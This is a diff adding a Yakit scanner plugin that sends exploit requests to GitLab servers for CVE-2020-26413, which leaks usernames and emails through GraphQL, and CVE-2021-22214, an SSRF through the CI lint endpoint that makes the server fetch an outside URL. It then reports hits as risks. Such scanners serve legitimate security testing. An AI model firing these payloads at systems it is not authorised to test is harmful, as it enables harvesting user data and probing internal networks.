@@ -1,0 +1,118 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+// 准备发送的报文模版 
+
+
+
+PacketPoc1 = `POST /api/graphql HTTP/1.1
+Host: {{params(target)}}
+Accept: */*
+Accept-Encoding: gzip
+Content-Length: 192
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+
+{{params(payload)}}`
+
+PacketPoc2 = `POST /api/v4/ci/lint HTTP/1.1
+Host: {{params(target)}}
+Accept: */*
+Accept-Encoding: gzip
+Content-Length: 192
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+
+{{params(payload)}}`
+
+//漏洞检测规则函数 
+rules = []
+addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
+    rules = append(rules, {
+        "packet": packet,
+        "payload": payload,
+        "check": check,
+        "type": riskType,
+        "typeVerbose": riskTypeVerbose,
+        "severity": severity,
+        "reference":reference,
+    })
+}
+
+
+//填充对应的漏洞检测规则
+addRule(PacketPoc1,"{\"query\":\"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }\",\"variables\":null,\"operationName\":null}",func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `{"data":{"users":{"edges":[{"node":{"username":"`) && str.MatchAllOfSubString(header, `x-runtime`) {
+        return true
+    }
+    return false
+},"信息泄露","gitlab-cve-2020-26413","high","https://fengchenzxc.github.io/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/GitLab/GitLab%20Graphql%E9%82%AE%E7%AE%B1%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-26413/")
+
+addRule(PacketPoc2,"{\"include_merged_yaml\": true, \"content\": \"include:\n  remote: http://baidu.com/api/v1/targets/?test.yml\"}",func(rsp,header,body){
+    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `{"status":"invalid","errors":`, `does not have valid YAML syntax`) || str.MatchAllOfSubString(body, `{"status":"invalid","errors":`, `could not be fetched`) {
+        return true
+    }
+    return false
+},"SSRF","gitlab-cve-2021-22214","high","https://mp.weixin.qq.com/s/HFug1khyfHmCujhc_Gm_yQ")
+
+
+
+//漏洞检测handle 
+handleRule = func(swg, isTls, addr, rule) {
+    swg.Add()
+    go func{
+        defer swg.Done()
+
+        defer func{
+            recover()
+        }
+
+        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
+        if err != nil {
+            yakit.Error("poc.HTTP error: %v", err)
+            return
+        }
+        header, body = poc.Split(resp)
+        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
+        url = urlIns.String()
+        if rule.check(rspIns, header, body) {
+            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
+            risk.NewRisk(
+                url, risk.severity(rule.severity), 
+                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
+                risk.titleVerbose(sprintf("reference %v", rule.reference)),
+                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
+                risk.payload(rule.payload), risk.details({
+                    "request": req,
+                    "response": resp,
+                    "url": url,
+                }),
+            )
+            return
+        }
+        return
+    }
+}
+
+
+
+handle = func(result) {
+    if !result.IsOpen() {
+        return
+    }
+
+    //判断是否是http
+    if len(result.Fingerprint.HttpFlows) <= 0 {
+        return
+    }
+    addr = str.HostPort(result.Target, result.Port)
+    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))
+
+    // 漏洞检测
+    swg = sync.NewSizedWaitGroup(10)
+    for _, rule = range rules {
+        handleRule(swg, isTls, addr, rule)
+    }
+    swg.Wait()
+}
